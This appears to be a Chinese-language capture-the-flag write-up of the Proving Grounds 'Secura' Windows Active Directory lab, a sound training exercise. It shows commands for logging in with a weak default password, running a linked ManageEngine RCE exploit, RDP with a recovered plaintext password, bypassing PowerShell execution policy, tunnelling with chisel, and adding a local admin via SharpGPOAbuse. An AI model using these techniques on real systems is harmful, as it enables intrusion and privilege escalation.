---
title: Proving Grounds Practive-Challenge 0 - Secura
date: 2025-9-11 20:00:00
tags: 红队
categories: 红队打靶-Windows_Active
---

# 信息收集

### **192.168.127.97**

![image-20250911172850880](./Challenge%200%20-%20Secura/image-20250911172850880.png)

### **192.168.127.96**

![image-20250911174823607](./Challenge%200%20-%20Secura/image-20250911174823607.png)

### **192.168.127.95**

![image-20250911174938610](./Challenge%200%20-%20Secura/image-20250911174938610.png)

![image-20250911174923208](./Challenge%200%20-%20Secura/image-20250911174923208.png)

![image-20250911174914199](./Challenge%200%20-%20Secura/image-20250911174914199.png)

## 95主机-web服务

95主机44444端口有一个`applications Manager`服务，尝试了一些弱密码`admin:admin`直接登录成功

![image-20250912134828216](./Challenge%200%20-%20Secura/image-20250912134828216.png)

这个服务的版本是14710，通过搜索可以知道该版本存在远程代码执行

[ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated) - Java webapps Exploit](./https://www.exploit-db.com/exploits/48793)

运行该exp需要`jdk`版本大于8，才可以生成jar文件

![image-20250912143416536](./Challenge%200%20-%20Secura/image-20250912143416536.png)

运行之后就可以得到一个shell

![image-20250912143541598](./Challenge%200%20-%20Secura/image-20250912143547485.png)

直接拿到system权限，就可以拿到95主机下的flag

![image-20250912143800277](./Challenge%200%20-%20Secura/image-20250912143800277.png)

# 在95主机上信息收集

## winPEASx64.exe

运行winPEASx64.exe，找到几个用户和密码

这个账号密码就可以远程连接到95主机

```
xfreerdp /u:administrator /p:'Reality2Show4!.?' /v:192.168.167.95
```

![image-20250912152820399](./Challenge%200%20-%20Secura/image-20250912152820399.png)

打开文件管理器也可以看到这个最近修改的文件

![image-20250912155119488](./Challenge%200%20-%20Secura/image-20250912155119488.png)

通过winPEASx64也可以发现

![image-20250912153338784](./Challenge%200%20-%20Secura/image-20250912153338784.png)

## PowerView.ps1

使用`powerview`进行域信息收集

先上传powerview，然后关闭安全机制，然后导入powerview.ps1,关闭安全机制只在这个窗口有用

```
powershell Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypas
Import-Module .\powerview.ps1
```

![image-20250912153750271](./Challenge%200%20-%20Secura/image-20250912153750271.png)

# 远程连接到96

上面的apache用户可以使用`evil-winrm`远程连接到96

在96本地运行了mysql，使用chisel将3306端口转发到kali上

```
./chisel_1.10.1_windows_amd64.exe client 192.168.45.222:8888 R:9999:127.0.0.1:3306

./chisel_1.10.1_linux_amd64 server -p 8888 --reverse
```

密码直接是空

![image-20250912163144253](./Challenge%200%20-%20Secura/image-20250912163144253.png)

查权限就可以知道有所有权限

![image-20250912163622753](./Challenge%200%20-%20Secura/image-20250912163622753.png)

![image-20250912163938724](./Challenge%200%20-%20Secura/image-20250912163938724.png)

![image-20250912164004902](./Challenge%200%20-%20Secura/image-20250912164004902.png)

![image-20250912164047690](./Challenge%200%20-%20Secura/image-20250912164047690.png)

`administrator`用户就是96主机的`administrator`用户

![image-20250912164142428](./Challenge%200%20-%20Secura/image-20250912164142428.png)

# 97主机信息收集

利用上面数据库中的另一个账户Charlotte

该账户既可以访问97主机的smb，也可以远程登录到97主机

但是smb中没有什么有用的信息

![image-20250912165250763](./Challenge%200%20-%20Secura/image-20250912165250763.png)

### 导入`powerview.ps1`

```
./powerview.ps1
Import-Module .\powerview.ps1

有时候会报错,windows不允许导入等等的，这是windows的安全机制
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypas
只需要在本窗口关闭，然后导入即可
```

### 1. `Get-NetGPO` 输出

```
Get-NetGPO
```

- **作用**：列出域内的 **Group Policy Objects（GPO）**
- 输出内容包括：
  - `displayname`：GPO 名称，比如 `Default Domain Policy`
  - `gpcfilesyspath`：GPO 文件在 SYSVOL 的共享路径
  - `distinguishedname`、`objectguid`：GPO 在 AD 的唯一标识
- 从输出中你看到两个 GPO：
  1. **Default Domain Policy**
  2. **Default Domain Controllers Policy**
- 这些是域控制器和域安全策略的核心策略。

### 3.`Get-GPPermission` 输出

```
Get-GPPermission -Name "Default Domain Policy" -All
```

**作用**：查看谁对该 GPO 有什么权限

输出字段：

- `Trustee`：账户或组
- `Permission`：权限类型，比如 `GpoApply`、`GpoEditDeleteModifySecurity`

重点发现：

- 用户 `charlotte` 拥有 **GpoEditDeleteModifySecurity** 权限 → 可以编辑、删除、修改 GPO 安全策略
- SYSTEM 也有类似权限

这说明 `charlotte` 可以通过 GPO **提升权限或修改策略**

![image-20250912171953885](./Challenge%200%20-%20Secura/image-20250912171953885.png)

### 4.`SharpGPOAbuse.exe` 使用

[下载地址](./https://github.com/byronkg/SharpGPOAbuse/releases?utm_source=chatgpt.com)

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
```

**作用**：利用 GPO 权限将 `charlotte` 添加为本地管理员，就是添加到administrators组

可以使用net localgroup administrators查看是否添加成功

背景：

- 因为 charlotte 对 Default Domain Policy 有修改权限
- 可以在策略中写入脚本或注册表修改，实现 **本地管理员提升**



添加成功

<font color=red>重新远程连接后</font>得到本地管理员权限

![image-20250912172017254](./Challenge%200%20-%20Secura/image-20250912172017254.png)